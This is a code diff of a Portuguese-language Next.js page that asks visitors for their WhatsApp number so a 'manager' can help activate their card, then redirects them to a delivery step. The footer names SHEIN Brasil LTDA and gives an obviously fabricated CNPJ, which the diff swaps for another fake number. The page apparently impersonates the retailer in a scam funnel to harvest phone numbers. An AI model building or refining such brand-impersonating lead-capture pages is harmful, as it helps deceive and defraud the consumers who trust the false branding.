@@ -4,58 +4,50 @@ import type React from "react"
 
 import { useState } from "react"
 import { useRouter } from "next/navigation"
-import { Trophy } from "lucide-react"
 import Image from "next/image"
-import { usePageTracking } from "@/hooks/use-tracking"
+import { Trophy } from "lucide-react"
+
+// Função para formatar WhatsApp
+const formatWhatsApp = (value: string) => {
+  const numbers = value.replace(/\D/g, "")
+
+  if (numbers.length <= 2) {
+    return numbers
+  } else if (numbers.length <= 7) {
+    return `(${numbers.slice(0, 2)}) ${numbers.slice(2)}`
+  } else if (numbers.length <= 11) {
+    return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7)}`
+  } else {
+    return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7, 11)}`
+  }
+}
+
+// Função para validar WhatsApp (11 dígitos)
+const validateWhatsApp = (whatsapp: string) => {
+  const numbers = whatsapp.replace(/\D/g, "")
+  return numbers.length === 11
+}
 
 export default function ManagerPage() {
   const router = useRouter()
   const [whatsapp, setWhatsapp] = useState("")
   const [isValid, setIsValid] = useState(false)
 
-  // Rastreia a página do gerente
-  usePageTracking("manager")
-
-  // Função para formatar o WhatsApp
-  const formatWhatsApp = (value: string) => {
-    // Remove tudo que não é número
-    const numbers = value.replace(/\D/g, "")
-
-    // Limita a 11 dígitos
-    const limited = numbers.slice(0, 11)
-
-    // Aplica a formatação (XX) XXXXX-XXXX
-    if (limited.length <= 2) {
-      return limited
-    } else if (limited.length <= 7) {
-      return `(${limited.slice(0, 2)}) ${limited.slice(2)}`
-    } else {
-      return `(${limited.slice(0, 2)}) ${limited.slice(2, 7)}-${limited.slice(7)}`
-    }
-  }
-
-  // Função para validar WhatsApp (11 dígitos)
-  const validateWhatsApp = (value: string) => {
-    const numbers = value.replace(/\D/g, "")
-    return numbers.length === 11
-  }
-
-  // Handler para mudança no input
   const handleWhatsAppChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const formatted = formatWhatsApp(e.target.value)
+    const value = e.target.value
+    const formatted = formatWhatsApp(value)
     setWhatsapp(formatted)
     setIsValid(validateWhatsApp(formatted))
   }
 
-  // Handler para continuar
   const handleContinue = () => {
     if (!isValid) return
 
     // Salva o WhatsApp no localStorage
-    const numbersOnly = whatsapp.replace(/\D/g, "")
-    localStorage.setItem("userWhatsApp", numbersOnly)
+    const cleanWhatsApp = whatsapp.replace(/\D/g, "")
+    localStorage.setItem("userWhatsApp", cleanWhatsApp)
 
-    console.log("WhatsApp salvo:", numbersOnly)
+    console.log("WhatsApp salvo:", cleanWhatsApp)
 
     // Redireciona para a próxima página
     router.push("/delivery-method")
@@ -71,7 +63,7 @@ export default function ManagerPage() {
             Conheça sua Gerente, ela irá auxiliar na ativação do seu cartão e esclarecer todas as suas dúvidas!
           </p>
 
-          {/* Card da Gerente */}
+          {/* Manager Card */}
           <div className="bg-[#fff7db] border border-[#ffbf00] rounded-xl p-5 pb-3 mb-5">
             <div className="flex justify-center mb-3">
               <Image
@@ -95,12 +87,12 @@ export default function ManagerPage() {
             </div>
           </div>
 
-          {/* Campo WhatsApp */}
+          {/* WhatsApp Input */}
           <div className="flex items-center justify-center mb-2">
             <Image src="/whatsapp-icon.png" alt="WhatsApp" width={20} height={20} className="mr-3" />
             <input
               type="tel"
-              className="flex h-10 w-full px-3 py-2 border-0 border-b border-gray-300 rounded-none bg-transparent text-base font-sans focus:border-gray-400 focus:ring-0 focus:outline-none flex-1"
+              className="flex h-10 w-full px-3 py-2 border-0 border-b border-gray-300 rounded-none bg-transparent text-base font-sans focus:border-gray-400 focus:ring-0 flex-1 focus:outline-none"
               placeholder="Digite seu WhatsApp aqui"
               maxLength={15}
               value={whatsapp}
@@ -115,12 +107,12 @@ export default function ManagerPage() {
             />
           </div>
 
-          {/* Botão Continuar */}
+          {/* Continue Button */}
           <button
             onClick={handleContinue}
             disabled={!isValid}
             className={`w-full font-bold py-4 px-6 rounded-lg text-base transition-colors ${
-              isValid ? "bg-black text-white hover:bg-gray-800" : "bg-gray-300 text-gray-500 cursor-not-allowed"
+              isValid ? "bg-black text-white hover:bg-black/90" : "bg-gray-300 text-gray-500 cursor-not-allowed"
             }`}
           >
             Continuar
@@ -131,7 +123,7 @@ export default function ManagerPage() {
       {/* Footer */}
       <footer className="bg-[#f9f9f9] border-t border-[#eaeaea] px-4 py-6 text-center mt-12">
         <div className="max-w-2xl mx-auto">
-          <p className="text-gray-600 text-xs mb-1 leading-tight">SHEIN Brasil LTDA | CNPJ: 12.345.678/0001-90</p>
+          <p className="text-gray-600 text-xs mb-1 leading-tight">SHEIN Brasil LTDA | CNPJ: 12.345.678/0001-99</p>
           <p className="text-gray-600 text-xs mb-2 leading-tight">
             Av. Paulista, 1000 - Bela Vista, São Paulo - SP, 01310-100
           </p>
